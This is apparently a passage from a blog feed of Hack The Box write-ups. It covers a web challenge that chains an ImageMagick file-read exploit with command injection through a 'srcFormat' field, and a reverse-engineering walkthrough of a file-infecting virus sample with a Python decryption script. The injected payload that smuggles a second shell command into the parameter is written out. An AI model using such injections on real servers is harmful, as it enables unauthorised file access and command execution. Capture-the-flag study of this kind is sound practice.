srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Naughty naughty imagemagick"
class="gallery-image"
data-flex-grow="309"
data-flex-basis="742px"
>&lt;/p>
&lt;p>&lt;code>Imagemagick-convert&lt;/code> is just a JavaScript interface for the &lt;code>convert&lt;/code> CLI tool from &lt;code>Imagemagick&lt;/code>, which according to the Dockerfile from the challenge is version &lt;code>7.1.0-33&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6.PNG"
width="1118"
height="291"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Its always suspicous when a single package uses a specific version"
class="gallery-image"
data-flex-grow="384"
data-flex-basis="922px"
>&lt;/p>
&lt;p>A little googling brings us to this &lt;a class="link" href="https://github.com/Sybil-Scan/imagemagick-lfi-poc" target="_blank" rel="noopener"
>exploit&lt;/a>.
Generating the exploit is pretty straightforward, just follow the instructions from the script.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1.PNG"
width="638"
height="146"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Exploit generation"
class="gallery-image"
data-flex-grow="436"
data-flex-basis="1048px"
>&lt;/p>
&lt;p>Now its important to note that the file read is only accessible if the output file of the &lt;code>convert&lt;/code> operation is a &lt;code>png&lt;/code>.
I got stuck on this for quite a while, but looking at the source code for the forum revealed another vulnerability.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7.PNG"
width="767"
height="659"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Why are we allowed to pass in arguments to a serverside CLI tool?"
class="gallery-image"
data-flex-grow="116"
data-flex-basis="279px"
>&lt;/p>
&lt;p>The fact that we can pass in our own arguments through intercepting the post request implies there is an argument that we can use that will allow us to change the output file format.
The source code for the convert function can be found here&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.npmjs.com/package/imagemagick-convert?activeTab=code" target="_blank" rel="noopener"
>imagemagick-convert&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>The code pretty much just creates a command string that is then passed to a command process.
The data from the uploaded image is passed through standard input, and our options are concatenated together.
The intended command string is supposed to look like this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; - AVIF:file_name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However, since it just concats whatever is passed to it without much processing, it allows for command injection.
The output file name is the last arg to be concated to the string, so we just need an option that occurs before it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Create occurrence
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} format
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} name
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @returns {string}
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">createOccurrence&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">occurrence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>For this purpose the &lt;code>srcFormat&lt;/code> option will work, especially because it is the argument that is inserted right before the output file name.
At this point I realized that I probably don&amp;rsquo;t have to use the built in vulnerability in the &lt;code>Imagemagick&lt;/code> module, and could probably just use the command injection I have here to spawn a shell or use &lt;code>mv&lt;/code> to copy the flag to the output directory, but the &lt;code>convert&lt;/code> tool has a &lt;code>-write&lt;/code> option that just simplifies everything so that is the reason I ended up not using a more sophisticated command injection payload.
Anyways, we will insert the following into the &lt;code>srcFormat&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The space after &lt;code>flag&lt;/code> and the &lt;code>; echo &lt;/code> are important in order to break up the original command and prevent any errors from breaking our injection.
The final command thats runs server side would be:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span> AVIF:file_name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2.PNG"
width="649"
height="587"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Inserting our new parameter on the POST request"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="265px"
>&lt;/p>
&lt;p>Then we can download the flag, and use &lt;code>exiftool -b&lt;/code> to extract the flag from the image :).&lt;/p></description></item><item><title>HTB Iterative Virus</title><link>https://Kvn11.github.io/p/htb-iterative-virus/</link><pubDate>Tue, 12 Sep 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-iterative-virus/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/hackthebox.jpg" alt="Featured image of post HTB Iterative Virus" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: While cleaning up the workspace of a recently retired employee, we noticed that one of the core files of the very important programs they were working on didn&amp;rsquo;t match up with the backups we have of it, could you check it out for us?&lt;/p>
&lt;/blockquote>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Upon running the executable, nothing out of the ordinary seemed to happen.
The &lt;code>.exe&lt;/code> printed &amp;ldquo;Hello World!&amp;rdquo; and exited normally.
&lt;code>PEBear&lt;/code> showed that there was another strange section in the exe file called &lt;code>.ivir&lt;/code>.
I made the assumption that this was a reference to &lt;code>I terative VIRus&lt;/code>, and the entry point being in this section further reinforced my theory that this was the &amp;ldquo;virus&amp;rdquo; part of the file.
The time stamp was set to &lt;code>deadc0de&lt;/code> which was also strange, since that translates to a date well into the future.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1.png"
width="1038"
height="523"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="PE Bear analysis"
class="gallery-image"
data-flex-grow="198"
data-flex-basis="476px"
>&lt;/p>
&lt;h2 id="reversing-with-ida-free">Reversing with IDA Free
&lt;/h2>&lt;p>The first interesting function to look at is one that returns a function name based on a number it is given.
It uses stack strings to prevent analysis tools from detecting the string as a string.
We can right click on the hex values to convert them to characters.
The result name is then passed to another function that seems to return a function pointer.
This made me think that the exe was dynamically resolving functions.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2.PNG"
width="484"
height="705"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Dynamic Resolving Function 1"
class="gallery-image"
data-flex-grow="68"
data-flex-basis="164px"
>&lt;/p>
&lt;p>After we sort through each function call and match up the result, we can see the functions that have been resolved:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3.PNG"
width="1426"
height="340"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Dynamic Resolving Function 2"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>After these functions have been resolved, there is a value 5 bytes after the entry point that is compared.
If the value is 5, then a function is called.
However, this function seems to be broken, encrypted, or heavily obfuscated since the disassembly doesn&amp;rsquo;t seem valid.
Otherwise, what seems like a key value is chosen and saved.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4.PNG"
width="671"
height="488"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Key Values"
class="gallery-image"
data-flex-grow="137"
data-flex-basis="330px"
>&lt;/p>
&lt;p>Then the exe will iterate over all the &lt;code>*.exe&lt;/code> files in its current directory, confirm some checks, and if everything looks good it will perform some actions on the current &lt;code>.exe&lt;/code> file.
The main check is that the timestamp of the file needs to be set to &lt;code>THIS&lt;/code> otherwise the infection of the file will not take place.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5.PNG"
width="733"
height="279"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Infection Checks"
class="gallery-image"
data-flex-grow="262"
data-flex-basis="630px"
>&lt;/p>
&lt;p>Most the proceeding infection process isn&amp;rsquo;t super important, and was in fact pretty tedious to look through and rename.
A new section and section header are added and modified to make sure they adhere to alignment rules, and the rest of the process is just copying over the infection code and making it so it replaces the entry point of the victim file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6.PNG"
width="927"
height="537"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Infection Process"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="414px"
>&lt;/p>
&lt;p>The end of the process loops over the data from the broken function from earlier, and multiplies it against the key value selected earlier.
This new modified code is then copied into the victim file.
Then the byte 5 bytes ahead of the entry point is incremented and copied into the victim file.
This means when the newly infected victim exe is run, it will use the second key.
Then the next file to be infected will use the third key, and so on until the 4th iteration when that special byte is set to 5.
At that point the strange function from earlier runs.
This implies that after a certain number of infections the strange function reveals itself.
I verified most of this with dynamic analysis as well, but didn&amp;rsquo;t take any screenshots.
If you want to verify with a debugger, set a breakpoint after the &lt;code>MapViewOfFile&lt;/code> function and follow it in dump.
From there you can follow along with the exe code as it checks and modifies different parts of the victim file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7.PNG"
width="870"
height="136"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Decryption Process"
class="gallery-image"
data-flex-grow="639"
data-flex-basis="1535px"
>&lt;/p>
&lt;p>I ran the exe in &lt;code>x64Dbg&lt;/code>, and copied out the encrypted code so I could manually decrypt it.
You could just manipulate the registers to do it all within &lt;code>x64Dbg&lt;/code> but I ran into exceptions doing that so I opted for the python approach.
Here is the script that decrypts the flag function:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0xE25C0FE4937ECD98&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x46943D7D6211854C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7ED9FD7403244F3B&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0954450DD34BC4FB&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x34738E7E3DC62246&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x382DF5BC3CDDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x138529F69C81C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xE9FCF6D4DD85105E&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x5B977D744A5DBD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xC2D93D4B963E5C85&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB3DD747A06D5A985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xD454843DE2F28EBF&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0215CEB076580EDC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3F55D6792852AA4D&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x17AF0A0E48DDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x547EA605BB8640AD&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x243D8A75B199B575&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x27D1C0EDAE5CB998&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6108284AE5787878&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7E49F4DF10792485&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xACD9F651E2F28EBF&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xADA04BA5BA8A1444&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xF77252CAFD2A38C9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x388BB9FB9D000000&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x8CC468D4A37B0000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x891DB54E4E4ABD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xEFCE883F2C030000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x399F79C914778100&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xB5B1F45FAD045A5C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB721A6D9B394FF4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB0DE9DB43DD7A1B3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xCC3AF2334A813038&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x3DD6D4E506470273&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x339B093AB6A0F837&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3E997481AE05CCA5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x689018943160B8AC&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xE35AE4EDCF035760&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6D46B194A1A37B36&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3619E5691F021894&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0AFD79C343528DEC&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0F7FEA94A59656C0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8DAE5CB998000000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1770879F9859C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x28B283C42B81C398&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x7B7B67D3051D07B1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xBFE4C34F82F76B75&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1B6CED770BFBA985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB8E5061F67130000&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x953D7B885F773041&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1C206CC310CA422A&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x87130CC425BC4A04&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x6E2368B9C685770B&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xEB7FD64E061C1A3D&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xCB8FF2D53D7505A1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xF1EF554206DCE4D&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hex_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hex_string&lt;/span>&lt;span class="p">)&lt;/span>
